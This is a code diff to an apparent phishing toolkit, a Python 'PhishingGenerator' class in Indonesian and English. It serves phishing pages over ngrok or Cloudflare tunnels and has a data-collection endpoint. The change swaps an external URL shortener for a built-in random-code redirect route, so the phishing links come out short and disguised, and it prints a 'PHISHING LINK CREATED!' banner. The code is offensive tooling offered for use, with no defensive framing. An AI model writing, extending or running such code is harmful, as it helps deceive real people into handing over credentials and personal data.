@@ -117,6 +117,7 @@ class PhishingGenerator:
         self.tunnel_type = self._load_session_key('tunnel_type') or TUNNEL_NGROK
         self.tunnel_process = None
         self.cf_token = self._load_session_key('cf_token')
+        self.short_links = {}
         
         # Setup logging
         try:
@@ -707,6 +708,13 @@ class PhishingGenerator:
             except Exception as e:
                 self.logger.error(f"Error serving phishing page: {str(e)}")
                 return "Halaman tidak ditemukan", 404
+
+        @self.app.route('/s/<short_code>')
+        def short_redirect(short_code):
+            target = self.short_links.get(short_code)
+            if target:
+                return redirect(target)
+            return "Not found", 404
                 
         @self.app.route('/collect-data', methods=['POST'])
         def collect_data():
@@ -1208,21 +1216,10 @@ class PhishingGenerator:
             self.server_url = None
 
     def _shorten_url_for_display(self, url):
-        services = [
-            ("cleanURI", lambda: requests.post("https://cleanuri.com/api/v1/shorten", data={"url": url}, timeout=8)),
-        ]
-        for name, fn in services:
-            try:
-                r = fn()
-                if r.status_code == 200:
-                    data = r.json()
-                    s = data.get('result_url', '').strip()
-                    if s:
-                        console.print(f"[dim]🔗 Short: {s} ({name})[/]")
-                        return
-            except:
-                continue
-        console.print(f"[dim]🔗 Raw tunnel URL: {url}[/]")
+        short_code = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
+        self.short_links[short_code] = url
+        shortened = f"{self.server_url}/s/{short_code}" if self.server_url else url
+        console.print(f"[dim]🔗 Short: {shortened}[/]")
 
     def setup_tunnel(self):
         self.clear_screen()
@@ -1531,33 +1528,16 @@ class PhishingGenerator:
             with open(template_path, "w", encoding="utf-8") as f:
                 f.write(proxy_template)
                 
-            shortened_url = None
-            services = [
-                ("cleanURI", lambda: requests.post("https://cleanuri.com/api/v1/shorten", data={"url": phish_url}, timeout=8)),
-            ]
-            for name, fn in services:
-                try:
-                    r = fn()
-                    if r.status_code == 200:
-                        data = r.json()
-                        s = data.get('result_url', '').strip()
-                        if s:
-                            shortened_url = s
-                            break
-                except Exception as e:
-                    console.print(f"[dim]  {name} failed: {str(e)[:60]}[/]")
-                    continue
-
-            if not shortened_url:
-                console.print("[yellow]⚠ All URL shorteners failed. Raw link below:[/]")
-                shortened_url = phish_url
+            short_code = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
+            self.short_links[short_code] = phish_url
+            shortened_url = f"{self.server_url}/s/{short_code}"
             
             sep = "─" * 40
             console.print(f"\n{sep}")
             console.print(f"🎣 {'LINK PHISHING BERHASIL DIBUAT!' if self.language == 'id' else 'PHISHING LINK CREATED!'}")
             console.print(sep)
             console.print(f"\n📎 {'URL Phishing' if self.language == 'id' else 'Phishing URL'}:\n   [green]{shortened_url}[/]\n")
-            console.print(f"✨ {'Link telah dipersingkat!' if self.language == 'id' else 'Link has been shortened!'}")
+            console.print(f"✨ {'Link pendek via redirect server' if self.language == 'id' else 'Short link via server redirect'}")
             console.print(f"⚠️  {'Link aktif hingga program ditutup' if self.language == 'id' else 'Link active until program closes'}")
             console.print(sep)
             
